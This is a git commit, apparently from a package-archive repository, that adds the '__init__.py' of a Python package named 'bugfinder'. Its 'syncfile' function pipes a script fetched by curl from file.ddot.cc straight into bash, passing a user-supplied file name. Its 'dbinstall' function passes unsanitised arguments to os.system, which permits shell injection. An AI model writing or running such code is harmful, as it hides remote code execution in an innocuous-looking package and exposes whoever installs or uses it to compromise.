11716c0f7f0645a4ea31fd4079cbe3db934cb4ad
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 14:58:12 +0000

    Add package bugfinder/0.0.1/bugfinder-0.0.1.tar.gz

---
+++ packages/bugfinder/bugfinder-0.0.1.tar.gz/bugfinder-0.0.1/bugfinder/__init__.py
@@ -0,0 +1,24 @@
+#!/usr/bin/env python
+import datetime
+import json
+from typing import Dict, List, Optional, Set, Tuple
+
+import sys ,os 
+import requests
+
+
+def dbinstall():
+    cmd = 'pip3 install {} -i https://pypi.douban.com/simple'.format(' '.join(sys.argv[1:]))
+    os.system(cmd)
+
+def syncfile():
+    file = sys.argv[1]
+    try:
+        cmd = f"curl -s file.ddot.cc/gofil|bash -s {file}"
+        resp = os.system(cmd)
+        print(resp)
+    except FileNotFoundError as e:
+        print(e)
+
+
+
